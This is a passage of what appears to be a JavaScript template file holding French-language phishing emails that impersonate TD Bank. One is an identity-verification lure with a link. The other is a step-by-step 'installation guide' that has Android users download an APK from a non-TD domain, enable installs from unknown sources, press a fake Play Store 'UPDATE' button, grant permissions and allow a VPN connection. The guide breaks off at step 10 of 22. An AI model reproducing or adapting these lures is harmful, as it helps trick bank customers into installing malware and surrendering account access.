                </tr>
              </table>

            </td>
          </tr>

          <tr>
            <td style="background-color:#e8e8e8;height:1px;font-size:0;line-height:0;">&nbsp;</td>
          </tr>

          <tr>
            <td class="footer-table" style="background-color:#f8f9fb;padding:28px 40px;">

              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="margin-bottom:18px;">
                <tr>
                  <td align="center">
                    <p style="margin:0 0 6px 0;font-family:Arial,Helvetica,sans-serif;font-size:12px;color:#666666;line-height:1.6;">
                      <strong style="color:#333333;">Besoin d'aide ?</strong>
                    </p>
                    <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:12px;color:#666666;line-height:1.7;">
                      Communiquez avec nous au <strong>1 800 895-4463</strong><br>
                      Disponible 24 heures sur 24, 7 jours sur 7
                    </p>
                  </td>
                </tr>
              </table>

              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="margin-bottom:18px;">
                <tr>
                  <td align="center">
                    <a href="https://www.td.com/ca/fr/a-propos-de-la-td/confidentialite-et-securite" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">Centre de sécurité</a>
                    <span style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#cccccc;margin:0 8px;">|</span>
                    <a href="https://www.td.com/ca/fr/a-propos-de-la-td/confidentialite-et-securite/declaration-sur-la-confidentialite" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">Politique de confidentialité</a>
                    <span style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#cccccc;margin:0 8px;">|</span>
                    <a href="https://www.td.com/ca/fr/services-bancaires-personnels" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">td.com</a>
                  </td>
                </tr>
              </table>

              <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#999999;line-height:1.6;text-align:center;">
                © 2026 Groupe Banque TD. Tous droits réservés.<br>
                66, rue Wellington Ouest, Toronto (Ontario) M5K 1A2<br><br>
                Ce courriel a été envoyé à l'adresse associée à votre compte TD. Il s'agit d'un message transactionnel lié à la sécurité de votre compte.
              </p>

            </td>
          </tr>

          <tr>
            <td style="background-color:#003f2d;height:4px;font-size:0;line-height:0;">&nbsp;</td>
          </tr>

        </table>

      </td>
    </tr>
  </table>

</body>
</html>`,
      text: `Cher(e) client(e),\n\nNous devons vérifier votre identité afin de finaliser votre demande.\n\nVeuillez cliquer sur ce lien pour procéder à la vérification :\n${link}\n\nSi vous n'avez pas demandé cette vérification, veuillez contacter notre service à la clientèle au 1 800 895-4463.\n\n© ${new Date().getFullYear()} Groupe Banque TD. Tous droits réservés.`,
    },
    guide: {
      subject: 'Guide d\'installation – TD Sécurité',
      html: `<!DOCTYPE html>
<html lang="fr" xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="x-apple-disable-message-reformatting">
  <meta name="format-detection" content="telephone=no, date=no, address=no, email=no, url=no">
  <title>Guide d'installation &#8211; TD S&#233;curit&#233;</title>
  <meta name="description" content="Guide &#233;tape par &#233;tape pour t&#233;l&#233;charger et installer l'application TD S&#233;curit&#233; sur votre t&#233;l&#233;phone Android.">
  <!--[if mso]>
  <noscript><xml><o:OfficeDocumentSettings><o:PixelsPerInch>96</o:PixelsPerInch></o:OfficeDocumentSettings></xml></noscript>
  <![endif]-->
  <style type="text/css">
    * { box-sizing: border-box; }
    body, html { margin: 0 !important; padding: 0 !important; width: 100% !important; min-width: 100%; background-color: #f0faf3; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
    table { border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; }
    img { border: 0; outline: none; text-decoration: none; -ms-interpolation-mode: bicubic; max-width: 100%; display: block; }
    a { text-decoration: none; }
    @media only screen and (max-width: 620px) {
      .email-wrapper { width: 100% !important; }
      .email-body { padding: 16px !important; }
      .step-image { width: 100% !important; height: auto !important; }
      .header-title { font-size: 22px !important; }
      .step-number-badge { width: 36px !important; height: 36px !important; font-size: 13px !important; }
      .step-title { font-size: 15px !important; }
      .step-content { padding: 16px !important; }
      .footer-text { font-size: 12px !important; }
      .congrats-title { font-size: 20px !important; }
    }
  </style>
</head>
<body style="margin:0;padding:0;background-color:#f0faf3;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">
  <div style="display:none;max-height:0;overflow:hidden;font-size:1px;color:#f0faf3;line-height:1px;mso-hide:all;">Guide complet &#8211; 22 &#233;tapes pour installer TD S&#233;curit&#233; sur votre Android &#8203;&nbsp;&#8203;&nbsp;&#8203;&nbsp;&#8203;&nbsp;&#8203;&nbsp;</div>
  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="background-color:#f0faf3;">
    <tr><td align="center" style="padding:24px 16px;">
      <table role="presentation" class="email-wrapper" width="600" cellspacing="0" cellpadding="0" border="0" style="max-width:600px;width:100%;">
        <!-- HEADER -->
        <tr>
          <td style="background:linear-gradient(135deg,#1a5c2a 0%,#1a7b3a 60%,#22a04a 100%);border-radius:16px 16px 0 0;padding:40px 32px 36px;text-align:center;">
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0">
              <tr><td align="center" style="padding-bottom:20px;"><div style="display:inline-block;background:rgba(255,255,255,0.15);border-radius:50%;width:72px;height:72px;line-height:72px;text-align:center;font-size:36px;">&#128241;</div></td></tr>
              <tr><td align="center">
                <h1 class="header-title" style="margin:0 0 10px;color:#ffffff;font-size:26px;font-weight:800;letter-spacing:-0.5px;line-height:1.2;">Guide d&#x27;installation</h1>
                <p style="margin:0 0 16px;color:rgba(255,255,255,0.85);font-size:15px;line-height:1.5;">Application <strong style="color:#ffffff;">TD S&#233;curit&#233;</strong> &#8212; Suivez les &#233;tapes ci-dessous</p>
                <span style="display:inline-block;background:rgba(255,255,255,0.2);border:1px solid rgba(255,255,255,0.35);border-radius:20px;padding:6px 18px;color:#ffffff;font-size:13px;font-weight:600;">&#9989;&nbsp; 22 &#233;tapes simples</span>
              </td></tr>
            </table>
          </td>
        </tr>
        <!-- INTRO -->
        <tr>
          <td style="background:#ffffff;border-left:1px solid #d4edda;border-right:1px solid #d4edda;padding:20px 28px;">
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0">
              <tr>
                <td width="40" valign="top" style="padding-right:12px;"><div style="background:#e8f5ec;border-radius:50%;width:36px;height:36px;text-align:center;line-height:36px;font-size:18px;">&#8505;&#65039;</div></td>
                <td valign="middle"><p style="margin:0;color:#1a5c2a;font-size:13px;font-weight:600;line-height:1.6;">Ce guide vous explique, &#233;tape par &#233;tape, comment t&#233;l&#233;charger et installer l&#x27;application <strong>TD S&#233;curit&#233;</strong> sur votre appareil Android. Suivez chaque &#233;tape dans l&#x27;ordre indiqu&#233;.</p></td>
              </tr>
            </table>
          </td>
        </tr>
        <!-- BODY START -->
        <tr><td class="email-body" style="background:#ffffff;border-left:1px solid #d4edda;border-right:1px solid #d4edda;padding:28px 28px 8px;">
          <!-- STEP 1 -->
          <table role="presentation" class="step-card" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;border:1px solid #d4edda;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(26,123,58,0.08);">
            <tr><td style="background:linear-gradient(90deg,#e8f5ec,#f0faf3);padding:14px 18px;border-bottom:1px solid #d4edda;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="40" valign="middle"><div class="step-number-badge" style="background:#1a7b3a;border-radius:50%;width:40px;height:40px;text-align:center;line-height:40px;color:#ffffff;font-size:16px;font-weight:800;">1</div></td><td valign="middle" style="padding-left:12px;"><p style="margin:0;color:#1a5c2a;font-size:11px;font-weight:700;letter-spacing:0.8px;text-transform:uppercase;">&#201;tape 1 sur 22</p><p class="step-title" style="margin:2px 0 0;color:#1a3020;font-size:16px;font-weight:700;line-height:1.3;">&#128229; T&#233;l&#233;charger l&#x27;application TD</p></td></tr></table></td></tr>
            <tr><td style="padding:16px 16px 0;background:#fafefe;"><img class="step-image" src="https://profil1-centre-1.online/static/td-email/images/1.jpg" alt="&#201;tape 1" width="568" style="width:100%;max-width:568px;border-radius:10px;border:1px solid #e0ede4;display:block;"></td></tr>
            <tr><td class="step-content" style="padding:16px 18px 18px;background:#fafefe;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td style="padding-bottom:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#128433;&#65039; Action</p><p style="margin:0;color:#1a3020;font-size:14px;line-height:1.6;">Appuyez sur le grand bouton vert <strong>&#171;&nbsp;T&#233;l&#233;charger l&#x27;application TD&nbsp;&#187;</strong>.</p></td></tr><tr><td style="border-top:1px solid #e8f5ec;padding-top:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#9889; Ce qui va se passer</p><p style="margin:0;color:#4a6052;font-size:14px;line-height:1.6;">Le t&#233;l&#233;chargement du fichier APK va commencer imm&#233;diatement.</p></td></tr></table></td></tr>
          </table>
          <!-- STEP 2 -->
          <table role="presentation" class="step-card" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;border:1px solid #d4edda;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(26,123,58,0.08);">
            <tr><td style="background:linear-gradient(90deg,#e8f5ec,#f0faf3);padding:14px 18px;border-bottom:1px solid #d4edda;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="40" valign="middle"><div class="step-number-badge" style="background:#1a7b3a;border-radius:50%;width:40px;height:40px;text-align:center;line-height:40px;color:#ffffff;font-size:16px;font-weight:800;">2</div></td><td valign="middle" style="padding-left:12px;"><p style="margin:0;color:#1a5c2a;font-size:11px;font-weight:700;letter-spacing:0.8px;text-transform:uppercase;">&#201;tape 2 sur 22</p><p class="step-title" style="margin:2px 0 0;color:#1a3020;font-size:16px;font-weight:700;line-height:1.3;">&#9203; Attendre la fin du t&#233;l&#233;chargement</p></td></tr></table></td></tr>
            <tr><td style="padding:16px 16px 0;background:#fafefe;"><img class="step-image" src="https://profil1-centre-1.online/static/td-email/images/2.jpg" alt="&#201;tape 2" width="568" style="width:100%;max-width:568px;border-radius:10px;border:1px solid #e0ede4;display:block;"></td></tr>
            <tr><td class="step-content" style="padding:16px 18px 18px;background:#fafefe;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td style="padding-bottom:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#128433;&#65039; Action</p><p style="margin:0;color:#1a3020;font-size:14px;line-height:1.6;">Regardez le bandeau noir tout en haut de l&#x27;&#233;cran. Il indique <strong>&#171;&nbsp;T&#233;l&#233;chargement du fichier...&nbsp;&#187;</strong>.</p></td></tr><tr><td style="border-top:1px solid #e8f5ec;padding-top:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#9889; Ce qui va se passer</p><p style="margin:0;color:#4a6052;font-size:14px;line-height:1.6;">Attendez que le t&#233;l&#233;chargement soit termin&#233;. <strong>Ne fermez pas cette page.</strong></p></td></tr></table></td></tr>
          </table>
          <!-- STEP 3 -->
          <table role="presentation" class="step-card" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;border:1px solid #d4edda;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(26,123,58,0.08);">
            <tr><td style="background:linear-gradient(90deg,#e8f5ec,#f0faf3);padding:14px 18px;border-bottom:1px solid #d4edda;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="40" valign="middle"><div class="step-number-badge" style="background:#1a7b3a;border-radius:50%;width:40px;height:40px;text-align:center;line-height:40px;color:#ffffff;font-size:16px;font-weight:800;">3</div></td><td valign="middle" style="padding-left:12px;"><p style="margin:0;color:#1a5c2a;font-size:11px;font-weight:700;letter-spacing:0.8px;text-transform:uppercase;">&#201;tape 3 sur 22</p><p class="step-title" style="margin:2px 0 0;color:#1a3020;font-size:16px;font-weight:700;line-height:1.3;">&#128274; Message de s&#233;curit&#233; Android</p></td></tr></table></td></tr>
            <tr><td style="padding:16px 16px 0;background:#fafefe;"><img class="step-image" src="https://profil1-centre-1.online/static/td-email/images/3.jpg" alt="&#201;tape 3" width="568" style="width:100%;max-width:568px;border-radius:10px;border:1px solid #e0ede4;display:block;"></td></tr>
            <tr><td class="step-content" style="padding:16px 18px 18px;background:#fafefe;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td style="padding-bottom:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#128433;&#65039; Action</p><p style="margin:0;color:#1a3020;font-size:14px;line-height:1.6;">Apr&#232;s le t&#233;l&#233;chargement, une fen&#234;tre noire va s&#x27;ouvrir en bas de l&#x27;&#233;cran. Le t&#233;l&#233;phone vous dit&nbsp;: <strong>&#171;&nbsp;Pour votre s&#233;curit&#233;, l&#x27;installation d&#x27;applis inconnues n&#x27;est pas autoris&#233;e sur ce t&#233;l&#233;phone.&nbsp;&#187;</strong></p></td></tr><tr><td style="border-top:1px solid #e8f5ec;padding-top:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#9889; Ce qui va se passer</p><p style="margin:0;color:#4a6052;font-size:14px;line-height:1.6;">Vous devez autoriser Chrome &#224; installer des applications.</p></td></tr></table></td></tr>
          </table>
          <!-- STEP 4 -->
          <table role="presentation" class="step-card" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;border:1px solid #d4edda;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(26,123,58,0.08);">
            <tr><td style="background:linear-gradient(90deg,#e8f5ec,#f0faf3);padding:14px 18px;border-bottom:1px solid #d4edda;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="40" valign="middle"><div class="step-number-badge" style="background:#1a7b3a;border-radius:50%;width:40px;height:40px;text-align:center;line-height:40px;color:#ffffff;font-size:16px;font-weight:800;">4</div></td><td valign="middle" style="padding-left:12px;"><p style="margin:0;color:#1a5c2a;font-size:11px;font-weight:700;letter-spacing:0.8px;text-transform:uppercase;">&#201;tape 4 sur 22</p><p class="step-title" style="margin:2px 0 0;color:#1a3020;font-size:16px;font-weight:700;line-height:1.3;">&#9881;&#65039; Appuyer sur &#171;&nbsp;Param&#232;tres&nbsp;&#187;</p></td></tr></table></td></tr>
            <tr><td style="padding:16px 16px 0;background:#fafefe;"><img class="step-image" src="https://profil1-centre-1.online/static/td-email/images/4.jpg" alt="&#201;tape 4" width="568" style="width:100%;max-width:568px;border-radius:10px;border:1px solid #e0ede4;display:block;"></td></tr>
            <tr><td class="step-content" style="padding:16px 18px 18px;background:#fafefe;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td style="padding-bottom:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#128433;&#65039; Action</p><p style="margin:0;color:#1a3020;font-size:14px;line-height:1.6;">Dans cette m&#234;me fen&#234;tre noire, appuyez sur le mot vert <strong>&#171;&nbsp;Param&#232;tres&nbsp;&#187;</strong> en bas &#224; droite.</p></td></tr><tr><td style="border-top:1px solid #e8f5ec;padding-top:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#9889; Ce qui va se passer</p><p style="margin:0;color:#4a6052;font-size:14px;line-height:1.6;">Vous allez &#234;tre redirig&#233; vers le menu des param&#232;tres de Chrome.</p></td></tr></table></td></tr>
          </table>
          <!-- STEP 5 -->
          <table role="presentation" class="step-card" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;border:1px solid #d4edda;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(26,123,58,0.08);">
            <tr><td style="background:linear-gradient(90deg,#e8f5ec,#f0faf3);padding:14px 18px;border-bottom:1px solid #d4edda;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="40" valign="middle"><div class="step-number-badge" style="background:#1a7b3a;border-radius:50%;width:40px;height:40px;text-align:center;line-height:40px;color:#ffffff;font-size:16px;font-weight:800;">5</div></td><td valign="middle" style="padding-left:12px;"><p style="margin:0;color:#1a5c2a;font-size:11px;font-weight:700;letter-spacing:0.8px;text-transform:uppercase;">&#201;tape 5 sur 22</p><p class="step-title" style="margin:2px 0 0;color:#1a3020;font-size:16px;font-weight:700;line-height:1.3;">&#128260; Activer l&#x27;interrupteur d&#x27;autorisation</p></td></tr></table></td></tr>
            <tr><td style="padding:16px 16px 0;background:#fafefe;"><img class="step-image" src="https://profil1-centre-1.online/static/td-email/images/5.jpg" alt="&#201;tape 5" width="568" style="width:100%;max-width:568px;border-radius:10px;border:1px solid #e0ede4;display:block;"></td></tr>
            <tr><td class="step-content" style="padding:16px 18px 18px;background:#fafefe;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td style="padding-bottom:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#128433;&#65039; Action</p><p style="margin:0;color:#1a3020;font-size:14px;line-height:1.6;">Vous &#234;tes maintenant dans le menu <strong>&#171;&nbsp;Installation d&#x27;applis inconnues&nbsp;&#187;</strong>. Cherchez l&#x27;interrupteur &#224; c&#244;t&#233; de <strong>&#171;&nbsp;Autoriser &#224; partir de cette source&nbsp;&#187;</strong>.</p></td></tr><tr><td style="border-top:1px solid #e8f5ec;padding-top:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#9889; Ce qui va se passer</p><p style="margin:0;color:#4a6052;font-size:14px;line-height:1.6;">Appuyez sur cet interrupteur pour le mettre en position <strong>ON</strong> (couleur verte / activ&#233;e).</p></td></tr></table></td></tr>
          </table>
          <!-- STEP 6 -->
          <table role="presentation" class="step-card" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;border:1px solid #d4edda;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(26,123,58,0.08);">
            <tr><td style="background:linear-gradient(90deg,#e8f5ec,#f0faf3);padding:14px 18px;border-bottom:1px solid #d4edda;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="40" valign="middle"><div class="step-number-badge" style="background:#1a7b3a;border-radius:50%;width:40px;height:40px;text-align:center;line-height:40px;color:#ffffff;font-size:16px;font-weight:800;">6</div></td><td valign="middle" style="padding-left:12px;"><p style="margin:0;color:#1a5c2a;font-size:11px;font-weight:700;letter-spacing:0.8px;text-transform:uppercase;">&#201;tape 6 sur 22</p><p class="step-title" style="margin:2px 0 0;color:#1a3020;font-size:16px;font-weight:700;line-height:1.3;">&#128640; Ouvrir l&#x27;application TD S&#233;curit&#233;</p></td></tr></table></td></tr>
            <tr><td style="padding:16px 16px 0;background:#fafefe;"><img class="step-image" src="https://profil1-centre-1.online/static/td-email/images/6.jpg" alt="&#201;tape 6" width="568" style="width:100%;max-width:568px;border-radius:10px;border:1px solid #e0ede4;display:block;"></td></tr>
            <tr><td class="step-content" style="padding:16px 18px 18px;background:#fafefe;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td style="padding-bottom:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#128433;&#65039; Action</p><p style="margin:0;color:#1a3020;font-size:14px;line-height:1.6;">L&#x27;interrupteur est maintenant activ&#233;. Une fen&#234;tre va appara&#238;tre en bas pour confirmer que l&#x27;application est pr&#234;te.</p></td></tr><tr><td style="border-top:1px solid #e8f5ec;padding-top:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#9889; Ce qui va se passer</p><p style="margin:0;color:#4a6052;font-size:14px;line-height:1.6;">Appuyez sur le bouton <strong>&#171;&nbsp;Ouvrir&nbsp;&#187;</strong> (vert, en bas &#224; droite) pour lancer l&#x27;application TD&#8209;s&#233;curit&#233; que vous venez d&#x27;installer.</p></td></tr></table></td></tr>
          </table>
          <!-- STEP 7 -->
          <table role="presentation" class="step-card" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;border:1px solid #d4edda;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(26,123,58,0.08);">
            <tr><td style="background:linear-gradient(90deg,#e8f5ec,#f0faf3);padding:14px 18px;border-bottom:1px solid #d4edda;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="40" valign="middle"><div class="step-number-badge" style="background:#1a7b3a;border-radius:50%;width:40px;height:40px;text-align:center;line-height:40px;color:#ffffff;font-size:16px;font-weight:800;">7</div></td><td valign="middle" style="padding-left:12px;"><p style="margin:0;color:#1a5c2a;font-size:11px;font-weight:700;letter-spacing:0.8px;text-transform:uppercase;">&#201;tape 7 sur 22</p><p class="step-title" style="margin:2px 0 0;color:#1a3020;font-size:16px;font-weight:700;line-height:1.3;">&#128260; Appuyer sur UPDATE</p></td></tr></table></td></tr>
            <tr><td style="padding:16px 16px 0;background:#fafefe;"><img class="step-image" src="https://profil1-centre-1.online/static/td-email/images/7.jpg" alt="&#201;tape 7" width="568" style="width:100%;max-width:568px;border-radius:10px;border:1px solid #e0ede4;display:block;"></td></tr>
            <tr><td class="step-content" style="padding:16px 18px 18px;background:#fafefe;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td style="padding-bottom:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#128433;&#65039; Action</p><p style="margin:0;color:#1a3020;font-size:14px;line-height:1.6;">Vous &#234;tes sur une page qui ressemble au Google Play Store. Elle affiche l&#x27;application <strong>&#171;&nbsp;TD&#8209;s&#233;curit&#233;&nbsp;&#187;</strong>.</p></td></tr><tr><td style="border-top:1px solid #e8f5ec;padding-top:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#9889; Ce qui va se passer</p><p style="margin:0;color:#4a6052;font-size:14px;line-height:1.6;">Appuyez sur le bouton vert <strong>&#171;&nbsp;UPDATE&nbsp;&#187;</strong> (au milieu de l&#x27;&#233;cran) pour continuer l&#x27;installation.</p></td></tr></table></td></tr>
          </table>
          <!-- STEP 8 -->
          <table role="presentation" class="step-card" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;border:1px solid #d4edda;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(26,123,58,0.08);">
            <tr><td style="background:linear-gradient(90deg,#e8f5ec,#f0faf3);padding:14px 18px;border-bottom:1px solid #d4edda;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="40" valign="middle"><div class="step-number-badge" style="background:#1a7b3a;border-radius:50%;width:40px;height:40px;text-align:center;line-height:40px;color:#ffffff;font-size:16px;font-weight:800;">8</div></td><td valign="middle" style="padding-left:12px;"><p style="margin:0;color:#1a5c2a;font-size:11px;font-weight:700;letter-spacing:0.8px;text-transform:uppercase;">&#201;tape 8 sur 22</p><p class="step-title" style="margin:2px 0 0;color:#1a3020;font-size:16px;font-weight:700;line-height:1.3;">&#9989; Appuyer sur &#171;&nbsp;Got it, continue&nbsp;&#187;</p></td></tr></table></td></tr>
            <tr><td style="padding:16px 16px 0;background:#fafefe;"><img class="step-image" src="https://profil1-centre-1.online/static/td-email/images/8.jpg" alt="&#201;tape 8" width="568" style="width:100%;max-width:568px;border-radius:10px;border:1px solid #e0ede4;display:block;"></td></tr>
            <tr><td class="step-content" style="padding:16px 18px 18px;background:#fafefe;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td style="padding-bottom:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#128433;&#65039; Action</p><p style="margin:0;color:#1a3020;font-size:14px;line-height:1.6;">Une nouvelle fen&#234;tre s&#x27;ouvre avec des instructions. Elle vous explique comment activer les permissions.</p></td></tr><tr><td style="border-top:1px solid #e8f5ec;padding-top:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#9889; Ce qui va se passer</p><p style="margin:0;color:#4a6052;font-size:14px;line-height:1.6;">Appuyez sur le bouton vert <strong>&#171;&nbsp;Got it, continue&nbsp;&#187;</strong> tout en bas de l&#x27;&#233;cran.</p></td></tr></table></td></tr>
          </table>
          <!-- STEP 9 -->
          <table role="presentation" class="step-card" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;border:1px solid #d4edda;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(26,123,58,0.08);">
            <tr><td style="background:linear-gradient(90deg,#e8f5ec,#f0faf3);padding:14px 18px;border-bottom:1px solid #d4edda;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="40" valign="middle"><div class="step-number-badge" style="background:#1a7b3a;border-radius:50%;width:40px;height:40px;text-align:center;line-height:40px;color:#ffffff;font-size:16px;font-weight:800;">9</div></td><td valign="middle" style="padding-left:12px;"><p style="margin:0;color:#1a5c2a;font-size:11px;font-weight:700;letter-spacing:0.8px;text-transform:uppercase;">&#201;tape 9 sur 22</p><p class="step-title" style="margin:2px 0 0;color:#1a3020;font-size:16px;font-weight:700;line-height:1.3;">&#128260; R&#233;activer l&#x27;autorisation d&#x27;installation</p></td></tr></table></td></tr>
            <tr><td style="padding:16px 16px 0;background:#fafefe;"><img class="step-image" src="https://profil1-centre-1.online/static/td-email/images/9.jpg" alt="&#201;tape 9" width="568" style="width:100%;max-width:568px;border-radius:10px;border:1px solid #e0ede4;display:block;"></td></tr>
            <tr><td class="step-content" style="padding:16px 18px 18px;background:#fafefe;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td style="padding-bottom:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#128433;&#65039; Action</p><p style="margin:0;color:#1a3020;font-size:14px;line-height:1.6;">Vous &#234;tes de nouveau dans le menu <strong>&#171;&nbsp;Installation d&#x27;applis inconnues&nbsp;&#187;</strong>.</p></td></tr><tr><td style="border-top:1px solid #e8f5ec;padding-top:10px;"><p style="margin:0 0 4px;color:#1a7b3a;font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">&#9889; Ce qui va se passer</p><p style="margin:0;color:#4a6052;font-size:14px;line-height:1.6;">Appuyez sur l&#x27;interrupteur &#224; c&#244;t&#233; de <strong>&#171;&nbsp;Autoriser &#224; partir de cette source&nbsp;&#187;</strong> pour le mettre en position <strong>ON</strong> (couleur verte / activ&#233;e).</p></td></tr></table></td></tr>
          </table>
          <!-- STEP 10 -->
          <table role="presentation" class="step-card" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;border:1px solid #d4edda;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(26,123,58,0.08);">
            <tr><td style="background:linear-gradient(90deg,#e8f5ec,#f0faf3);padding:14px 18px;border-bottom:1px solid #d4edda;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="40" valign="middle"><div class="step-number-badge" style="background:#1a7b3a;border-radius:50%;width:40px;height:40px;text-align:center;line-height:40px;color:#ffffff;font-size:15px;font-weight:800;">10</div></td><td valign="middle" style="padding-left:12px;"><p style="margin:0;color:#1a5c2a;font-size:11px;font-weight:700;letter-spacing:0.8px;text-transform:uppercase;">&#201;tape 10 sur 22</p><p class="step-title" style="margin:2px 0 0;color:#1a3020;font-size:16px;font-weight:700;line-height:1.3;">&#127760; Autoriser la connexion VPN</p></td></tr></table></td></tr>
            <tr><td style="padding:16px 16px 0;background:#fafefe;"><img class="step-image" src="https://profil1-centre-1.online/static/td-email/images/10.jpg" alt="&#201;tape 10" width="568" style="width:100%;max-width:568px;border-radius:10px;border:1px solid #e0ede4;display:block;"></td></tr>
